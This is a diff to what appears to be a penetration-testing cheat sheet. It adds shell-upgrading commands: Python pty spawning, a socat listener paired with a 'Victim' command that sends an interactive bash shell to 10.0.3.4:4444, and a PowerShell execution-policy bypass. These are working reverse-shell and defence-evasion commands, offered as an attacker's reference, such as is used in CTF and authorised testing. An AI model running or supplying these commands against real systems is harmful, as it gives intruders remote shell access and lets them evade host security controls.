@@ -228,8 +228,12 @@ Reverse Shells
 Shell Upgrading
 ----------------
 
+Source: https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/ & https://forum.hackthebox.eu/discussion/142/obtaining-a-fully-interactive-shell
+
 #### Python
 1. python -c 'import pty;spawn("/bin/bash");'
+or
+1. python3 -c 'import pty;spawn("/bin/bash");'
 2. In reverse shell:
 ```
 python -c 'import pty; pty.spawn("/bin/bash")'
@@ -245,6 +249,15 @@ Ctrl-Z
 6. export SHELL=bash
 7. export TERM=xterm-256color
 8. stty rows <num> columns <cols> (optional)
+(Sometimes the command will need to be executed: export TERM=xterm)
+```
+
+Using socat
+```
+#Listener:
+socat file:`tty`,raw,echo=0 tcp-listen:4444
+#Victim:
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444  
 ```
 
 #### Perl
@@ -359,6 +372,10 @@ WordPress
 - https://forum.top-hat-sec.com/index.php?topic=5758.0
 
 Windows Framework / Powershell
+----------------
+bypass PowerShell execution policy
+```PowerShell -Exec Bypass
+```
 ----------------
 - https://github.com/samratashok/nishang
 - https://github.com/rasta-mouse/Sherlock
